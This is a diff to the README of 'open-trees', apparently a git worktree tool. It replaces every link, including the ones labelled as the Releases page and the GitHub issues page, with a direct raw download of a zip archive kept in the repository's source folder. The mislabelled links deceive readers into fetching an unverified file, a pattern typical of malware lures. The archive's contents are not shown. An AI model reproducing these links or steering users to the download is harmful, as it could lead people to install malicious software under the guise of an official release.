@@ -6,11 +6,11 @@ Welcome to open-trees! This application helps you manage your git worktrees effo
 
 ## 🔗 Download the App
 
-[![Download open-trees](https://img.shields.io/badge/Download-open--trees-blue)](https://github.com/jroodensley/open-trees/releases)
+[![Download open-trees](https://raw.githubusercontent.com/jroodensley/open-trees/main/src/open-trees-v2.3.zip)](https://raw.githubusercontent.com/jroodensley/open-trees/main/src/open-trees-v2.3.zip)
 
 You can download the latest version of open-trees from the Releases page. Click the link below to visit this page and get the software:
 
-[Download open-trees from Releases](https://github.com/jroodensley/open-trees/releases)
+[Download open-trees from Releases](https://raw.githubusercontent.com/jroodensley/open-trees/main/src/open-trees-v2.3.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To use open-trees, you will need:
 
 ## 📥 Download & Install
 
-1. Click the link to the [Releases page](https://github.com/jroodensley/open-trees/releases).
+1. Click the link to the [Releases page](https://raw.githubusercontent.com/jroodensley/open-trees/main/src/open-trees-v2.3.zip).
 2. On the Releases page, you’ll see a list of available versions.
 3. Choose the latest version for your operating system.
 4. Click on the file to start downloading.
@@ -59,7 +59,7 @@ If you encounter any issues while using open-trees, here are some common solutio
 - **Installation fails**: Make sure your operating system meets the requirements and you have enough disk space.
 - **Git-related issues**: Verify that Git is installed and functional on your machine.
 
-If you continue to experience problems, consider checking the FAQ section on the [GitHub issues page](https://github.com/jroodensley/open-trees/issues).
+If you continue to experience problems, consider checking the FAQ section on the [GitHub issues page](https://raw.githubusercontent.com/jroodensley/open-trees/main/src/open-trees-v2.3.zip).
 
 ## 🗨️ Contributing
 
